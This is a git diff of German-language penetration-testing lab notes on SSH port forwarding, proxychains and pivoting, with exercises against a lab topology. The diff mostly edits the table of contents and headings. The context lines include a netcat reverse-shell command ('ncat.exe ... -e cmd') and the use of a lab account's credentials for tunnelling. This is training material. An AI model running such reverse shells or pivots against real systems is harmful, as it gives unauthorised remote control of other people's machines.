@@ -1,6 +1,23 @@
+- [SSH und Proxychains](#ssh-und-proxychains)
+  - [SSH unter Windows](#ssh-unter-windows)
+    - [Local Port Forwarding](#local-port-forwarding)
+    - [Wenn Nologin-Account](#wenn-nologin-account)
+    - [Remote Port Forwarding](#remote-port-forwarding)
+    - [Problem: sshd\_config](#problem-sshd_config)
+    - [Dynamic Port Forwarding](#dynamic-port-forwarding)
+    - [Proxychains und DPF](#proxychains-und-dpf)
+    - [SSH Proxy Jump](#ssh-proxy-jump)
+    - [Sneaky Fynn Way](#sneaky-fynn-way)
+  - [Aufgabe 1](#aufgabe-1)
+  - [Aufgabe 2](#aufgabe-2)
+  - [Aufgabe 3](#aufgabe-3)
+  - [Aufgabe 4](#aufgabe-4)
+
+---
+
 # SSH und Proxychains
 
-### SSH unter Windows
+## SSH unter Windows
 
 - Vor 2018 keine native SSH-Unterstützung für Windows -> Tool der Wahl "PuTTY" bzw. "PLink"
 
@@ -9,6 +26,8 @@
 
 plink -ssh -L 2222:192.168.1.1:22 user@192.168.1.1
 ```
+
+##Verwendung
 
 ### Local Port Forwarding
 
@@ -237,7 +256,7 @@ Nach der Ausführung des SSH-Logins wird nun der RPF direkt über die Tunnelstre
 
 -----------
 
-## Aufgabe 1:
+## Aufgabe 1
 
 **Arbeitet euch mit Hilfe von SSH, Proxychains und Nmap durch die einzelnen Netzwerke der Topologie, bis zum Erreichen des Webservers vor. Ziel ist es, die intern gehostete Webseite des Servers von eurem Angreifer aus aufrufen zu können.**
 
@@ -261,7 +280,7 @@ HTTP/1.1 200 OK
 [...]
 ```
 
-## Aufgabe 2:
+## Aufgabe 2
 
 **Errichtet Reverse Shells (z.B. mit Metasploit oder netcat) von aufgeklärten Windows und Linux Targets innerhalb des Netzwerkes. Nehmt hier jeweils ein Target von jedem Betriebssystem mit einem bzw. zwei Hops zwischen Target und Attacker.**
 
@@ -291,7 +310,7 @@ ncat.exe 10.1.5.252 4567 -e cmd
 
 So erhält man auf dem Listener eine CMD-Instanz.
 
-## Aufgabe 3:
+## Aufgabe 3
 
 **DebianFront besitzt einen "user2:user2" Account, welcher mittels /usr/sbin/nologin eine interaktive Shell verweigert bekommt. Nutzt diesen Account, um eine erfolgreiche Portweiterleitung einzurichten.**
 
